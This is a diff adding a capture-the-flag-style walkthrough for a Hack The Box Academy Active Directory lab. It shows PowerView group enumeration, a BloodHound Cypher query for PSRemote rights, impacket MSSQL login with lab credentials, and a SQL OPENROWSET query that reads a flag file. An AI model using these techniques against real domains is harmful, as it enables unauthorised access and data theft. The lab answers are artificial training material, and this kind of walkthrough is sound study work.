@@ -1111,3 +1111,57 @@ Mycleart3xtP@ss!
 4bb3b317845f0954200a6b0acc9b9f9a
 
 
+# Privileged Access
+
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.201.16 (ACADEMY-EA-MS01) ,10.129.138.209 (ACADEMY-EA-ATTACK01)   
+
+Life Left: 174 Terminate 
+
+
+ RDP to 10.129.201.16 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"
+
++ 0  What other user in the domain has CanPSRemote rights to a host?
+
+```powershell
+PS C:\Tools> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+
+
+ComputerName : ACADEMY-EA-MS01
+GroupName    : Remote Management Users
+MemberName   : INLANEFREIGHT\forend
+SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
+IsGroup      : False
+IsDomain     : UNKNOWN
+```
+
+Truy vấn trên powershell chỉ cho thấy forend, tiếp tục truy vấn bằng bloodhound:
+
+```cypher
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+```
+
+![](images/18.png)
+
++ 0  What host can this user access via WinRM? (just the computer name)
+
+DC01
+
+ Authenticate to ACADEMY-EA-DB01 with user "damundsen" and password "SQL1234!"
+
++ 0  Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.
+
+
+![](images/19.png)
+
+```zsh
+impacket-mssqlclient INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+```
+
+```sql
+SQL> SELECT * FROM OPENROWSET(BULK N'C:/Users/damundsen/Desktop/flag.txt', SINGLE_CLOB) AS Contents
+```
